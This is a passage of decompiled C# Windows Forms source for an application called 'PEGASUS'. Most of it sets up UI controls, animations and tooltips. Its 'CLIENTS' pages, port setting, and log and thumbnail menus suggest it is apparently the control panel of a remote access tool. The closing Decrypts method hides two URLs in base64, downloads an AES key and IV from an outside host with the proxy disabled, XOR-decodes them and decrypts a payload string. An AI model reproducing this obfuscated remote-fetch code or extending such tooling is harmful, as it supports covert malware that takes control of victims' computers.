			guna2Transition2.SetDecoration(guna2Shapes2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2Shapes2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2Shapes2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Shapes2.FillColor = System.Drawing.Color.Transparent;
			guna2Shapes2.Location = new System.Drawing.Point(21, 524);
			guna2Shapes2.Name = "guna2Shapes2";
			guna2Shapes2.PolygonSides = 6;
			guna2Shapes2.PolygonSkip = 1;
			guna2Shapes2.Rotate = 0f;
			guna2Shapes2.Size = new System.Drawing.Size(53, 68);
			guna2Shapes2.TabIndex = 11;
			guna2Shapes2.Text = "CLIENTS";
			guna2HtmlToolTip1.SetToolTip(guna2Shapes2, "Useful Links!");
			guna2Shapes2.Zoom = 80;
			guna2Shapes2.Click += new System.EventHandler(guna2Shapes2_Click);
			guna2Shapes1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2Shapes1.BackColor = System.Drawing.Color.Transparent;
			guna2Shapes1.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2Shapes1.BackgroundImage");
			guna2Shapes1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
			guna2Shapes1.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2Shapes1.BorderThickness = 1;
			loadForm.SetDecoration(guna2Shapes1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(guna2Shapes1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2Shapes1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2Shapes1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Shapes1.FillColor = System.Drawing.Color.Transparent;
			guna2Shapes1.Location = new System.Drawing.Point(21, 253);
			guna2Shapes1.Name = "guna2Shapes1";
			guna2Shapes1.PolygonSides = 6;
			guna2Shapes1.PolygonSkip = 1;
			guna2Shapes1.Rotate = 0f;
			guna2Shapes1.Size = new System.Drawing.Size(53, 68);
			guna2Shapes1.TabIndex = 10;
			guna2Shapes1.Text = "CLIENTS";
			guna2HtmlToolTip1.SetToolTip(guna2Shapes1, "Clients Page!");
			guna2Shapes1.UseTransparentBackground = true;
			guna2Shapes1.Visible = false;
			guna2Shapes1.Zoom = 80;
			guna2Shapes5.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2Shapes5.BackColor = System.Drawing.Color.Transparent;
			guna2Shapes5.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2Shapes5.BackgroundImage");
			guna2Shapes5.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
			guna2Shapes5.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2Shapes5.BorderThickness = 1;
			loadForm.SetDecoration(guna2Shapes5, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(guna2Shapes5, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(guna2Shapes5, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2Shapes5, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Shapes5.FillColor = System.Drawing.Color.Transparent;
			guna2Shapes5.Location = new System.Drawing.Point(21, 389);
			guna2Shapes5.Name = "guna2Shapes5";
			guna2Shapes5.PolygonSides = 6;
			guna2Shapes5.PolygonSkip = 1;
			guna2Shapes5.Rotate = 0f;
			guna2Shapes5.Size = new System.Drawing.Size(53, 68);
			guna2Shapes5.TabIndex = 9;
			guna2Shapes5.Text = "CLIENTS";
			guna2HtmlToolTip1.SetToolTip(guna2Shapes5, "About Page!");
			guna2Shapes5.Zoom = 80;
			guna2Shapes5.Click += new System.EventHandler(aboutToolStripMenuItem1_Click);
			guna2Transition2.AnimationType = Guna.UI2.AnimatorNS.AnimationType.Particles;
			guna2Transition2.Cursor = null;
			animation2.AnimateOnlyDifferences = true;
			animation2.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation28.BlindCoeff");
			animation2.LeafCoeff = 0f;
			animation2.MaxTime = 1f;
			animation2.MinTime = 0f;
			animation2.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation28.MosaicCoeff");
			animation2.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation28.MosaicShift");
			animation2.MosaicSize = 1;
			animation2.Padding = new System.Windows.Forms.Padding(100, 50, 100, 150);
			animation2.RotateCoeff = 0f;
			animation2.RotateLimit = 0f;
			animation2.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation28.ScaleCoeff");
			animation2.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation28.SlideCoeff");
			animation2.TimeCoeff = 2f;
			animation2.TransparencyCoeff = 0f;
			guna2Transition2.DefaultAnimation = animation2;
			guna2NotificationPaint1.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2NotificationPaint1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2NotificationPaint1.Font = new System.Drawing.Font("Electrolize", 8.23f, System.Drawing.FontStyle.Bold);
			loadForm.AnimationType = Guna.UI2.AnimatorNS.AnimationType.Particles;
			loadForm.Cursor = null;
			animation3.AnimateOnlyDifferences = true;
			animation3.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation26.BlindCoeff");
			animation3.LeafCoeff = 0f;
			animation3.MaxTime = 1f;
			animation3.MinTime = 0f;
			animation3.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation26.MosaicCoeff");
			animation3.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation26.MosaicShift");
			animation3.MosaicSize = 1;
			animation3.Padding = new System.Windows.Forms.Padding(100, 50, 100, 150);
			animation3.RotateCoeff = 0f;
			animation3.RotateLimit = 0f;
			animation3.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation26.ScaleCoeff");
			animation3.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation26.SlideCoeff");
			animation3.TimeCoeff = 2f;
			animation3.TransparencyCoeff = 0f;
			loadForm.DefaultAnimation = animation3;
			guna2Transition3.AnimationType = Guna.UI2.AnimatorNS.AnimationType.Mosaic;
			guna2Transition3.Cursor = null;
			animation4.AnimateOnlyDifferences = true;
			animation4.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation25.BlindCoeff");
			animation4.LeafCoeff = 0f;
			animation4.MaxTime = 1f;
			animation4.MinTime = 0f;
			animation4.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation25.MosaicCoeff");
			animation4.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation25.MosaicShift");
			animation4.MosaicSize = 20;
			animation4.Padding = new System.Windows.Forms.Padding(30);
			animation4.RotateCoeff = 0f;
			animation4.RotateLimit = 0f;
			animation4.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation25.ScaleCoeff");
			animation4.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation25.SlideCoeff");
			animation4.TimeCoeff = 0f;
			animation4.TransparencyCoeff = 0f;
			guna2Transition3.DefaultAnimation = animation4;
			guna2HtmlToolTip1.AllowLinksHandling = true;
			guna2HtmlToolTip1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2HtmlToolTip1.BorderColor = System.Drawing.Color.FromArgb(198, 25, 31);
			guna2HtmlToolTip1.MaximumSize = new System.Drawing.Size(0, 0);
			guna2HtmlToolTip1.TitleFont = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			guna2HtmlToolTip1.TitleForeColor = System.Drawing.Color.FromArgb(198, 25, 31);
			guna2HtmlToolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
			guna2HtmlToolTip1.ToolTipTitle = "PEGASUS";
			base.AutoScaleDimensions = new System.Drawing.SizeF(96f, 96f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
			AutoSize = true;
			BackColor = System.Drawing.Color.Lime;
			base.ClientSize = new System.Drawing.Size(1760, 848);
			base.Controls.Add(guna2ShadowPanel1);
			base.Controls.Add(LISTVIEWPANEL0);
			base.Controls.Add(tabControl1);
			base.Controls.Add(listView2);
			base.Controls.Add(listView3);
			base.Controls.Add(panel2);
			base.Controls.Add(panel3);
			guna2Transition2.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
			Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ForeColor = System.Drawing.Color.LightGray;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(2);
			base.Name = "PEGASUSMain";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "PEGASUS";
			base.TransparencyKey = System.Drawing.Color.Lime;
			base.Activated += new System.EventHandler(Form1_Activated);
			base.Deactivate += new System.EventHandler(Form1_Deactivate);
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(PEGASUSMain_FormClosed);
			base.Load += new System.EventHandler(Form1_Load);
			contextMenuLogs.ResumeLayout(false);
			contextMenuThumbnail.ResumeLayout(false);
			((System.ComponentModel.ISupportInitialize)performanceCounter1).EndInit();
			((System.ComponentModel.ISupportInitialize)performanceCounter2).EndInit();
			tabControl1.ResumeLayout(false);
			guna2ContextMenuStrip2.ResumeLayout(false);
			LISTVIEWSPANEL1.ResumeLayout(false);
			LISTVIEWSPANEL1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox5).EndInit();
			buttonspanel.ResumeLayout(false);
			((System.ComponentModel.ISupportInitialize)numPort).EndInit();
			guna2ContextMenuStrip1.ResumeLayout(false);
			LISTVIEWSPANELSMALL2.ResumeLayout(false);
			LISTVIEWSPANELSMALL2.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			statusStrip1.ResumeLayout(false);
			statusStrip1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox4).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox3).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox2).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
			panel1.ResumeLayout(false);
			guna2ShadowPanel1.ResumeLayout(false);
			LISTVIEWPANEL0.ResumeLayout(false);
			guna2Panel1.ResumeLayout(false);
			guna2Panel2.ResumeLayout(false);
			((System.ComponentModel.ISupportInitialize)guna2NumericUpDown1).EndInit();
			ResumeLayout(false);
		}

		private static string reupload(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				char value = (char)(array[i] ^ c);
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}

		public static string Decrypts(string encrypted)
		{
			using WebClient webClient = new WebClient();
			webClient.Proxy = null;
			string str = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2tleS50eHQ=")));
			string str2 = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly92ZW5vbW9mZmljaWFsLm5ldC9GYXJGcm9tSG9tZS9NeVRoaW5ncy9MT0NLL2l2LnR4dA==")));
			byte[] array = Convert.FromBase64String(encrypted);
			AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.BlockSize = 128;
			aesCryptoServiceProvider.KeySize = 256;
			aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(reupload(str));
			aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(reupload(str2));
			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
			byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
			cryptoTransform.Dispose();
			return Encoding.ASCII.GetString(bytes);
		}
	}
}